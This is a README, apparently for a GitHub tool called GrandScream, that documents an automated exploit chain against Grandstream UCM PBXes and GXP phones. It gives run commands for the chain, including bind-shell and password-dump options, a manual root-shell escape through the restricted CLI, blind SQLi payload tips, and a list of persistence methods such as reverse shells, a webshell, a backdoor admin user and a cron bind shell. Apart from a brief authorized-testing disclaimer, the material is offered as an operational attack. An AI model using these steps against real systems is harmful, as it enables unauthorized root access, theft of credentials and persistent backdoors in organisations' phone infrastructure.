# GrandScream

Automated exploitation chain for Grandstream UCM PBXes and GXP phones.

<img width="1386" height="879" alt="image" src="https://github.com/user-attachments/assets/60002bb4-79b4-49b4-a608-530863483261" />

## What it does

Single-script, no-dependency chain from a GXP phone on the Internal(i haven't actually tried it externally but i see no reason why it wouldn't work) to root on the UCM PBX:

1. **Phone recon** — unauth SIP account leak (`/cgi-bin/api-get_accounts`) discovers the PBX IP and extension
2. **PBX fingerprint** — unauth version probe (`/cgi?action=getInfo`) identifies firmware
3. **CTI blind SQLi** — CVE-2020-5726 on TCP 8888, no credentials needed. Binary-search extraction of the admin password from the challenge table (~30 sec)
4. **UCM web login** — challenge-response (md5) against `/cgi` on 8089. Session cookie obtained
5. **SIP credential dump** — authenticated `getSipAccount` calls harvest every extension's SIP auth-id and secret
6. **Phone takeover** — credential reuse against the GXP web admin (`/cgi-bin/dologin`). Full config readable
7. **Root shell** — SSH (port 22) into the UCM's restricted maintenance CLI -> `config` -> `unset a;/bin/sh` (CVE-2020-5759) -> interactive root busybox shell

## CVEs exploited

| CVE | Type | Access | Description |
|-----|------|--------|-------------|
| CVE-2020-5726 | Blind SQLi | Unauth (TCP 8888) | CTI challenge query, extract user passwords |
| CVE-2020-5722 | SQLi -> RCE | Unauth (TCP 8089) | sendPasswordEmail command injection (patched heredoc on tested fw) |
| CVE-2020-5759 | Command injection | Auth (SSH) | Restricted CLI `unset` parameter injection -> root shell |
| CVE-2019-10662 | Command injection | Auth (web) | backupUCMConfig file-backup parameter (untested, fw < 1.0.19.20) |

## Verified against

- **UCM6510** firmware 1.0.18.13 (vulnerable: < 1.0.19.20)
- **GXP1625** firmware 1.0.7.11

## Requirements

- Python 3.8+
- Standard library only: `socket`, `ssl`, `struct`, `urllib`, `hashlib`, `argparse`
- Paramiko (optional, for SSH shell): `pip install 'paramiko<5'`

## Quick start

```bash
# full chain from a phone IP
python grandscream.py --phone 10.20.0.108

# full chain + root shell via SSH
python grandscream.py --phone 10.20.0.108 --shell ssh

# full chain + bind shell via sendemail RCE (rate-limited, 60s)
python grandscream.py --phone 10.20.0.108 --shell bind --bind-port 5555

# skip SQLi, use known password
python grandscream.py --phone 10.20.0.108 --password admin@123456

# dump all 34 extension passwords (slow, ~10 min)
python grandscream.py --phone 10.20.0.108 --dump-users
```

## Manually getting a root shell

If you just want the shell without the chain:

```bash
ssh webadminuser@<UCM_IP>               # use the web admin password
UCM65xx > config
CONFIG > unset a;/bin/sh          # CVE-2020-5759
~ # id                            # uid=0(root)
```

## Persistence options

Six post-exploitation pivot methods are possible (i have removed it from the script)

- Bind shell via nc
- SSH root key (persistent)
- Cron @reboot bind shell
- SQLite backdoor admin user (INSERT INTO users)
- CGI webshell on lighttpd
- Reverse shell via nc

Most UCM have `nc`, `wget`, `busybox`, `python`, `iptables` (all ACCEPT), and an existing `/root/.ssh/authorized_keys` — everything you need for persistence.

## Notes

- The blind SQLi needs a trailing space after `--` comments (SQLite quirk): `admin' AND 1=1-- ` not `--`.
- LIMIT/OFFSET dumps without ORDER BY misalign column pairs (index vs rowid scan order). The script avoids this by extracting single columns from the challenge table directly.
- sendPasswordEmail RCE (CVE-2020-5722) is rate-limited to 1 per 60 seconds and the tested firmware uses a quoted heredoc — the command injection may not fire. The SSH CLI escape (CVE-2020-5759) is the reliable root path.
- Phone admin password is often the SIP secret reused. The unauth account leak on the phone gives you the extension number; the CTI SQLi gives you the password.

## License

For authorized security testing only. The authors assume no liability for misuse.
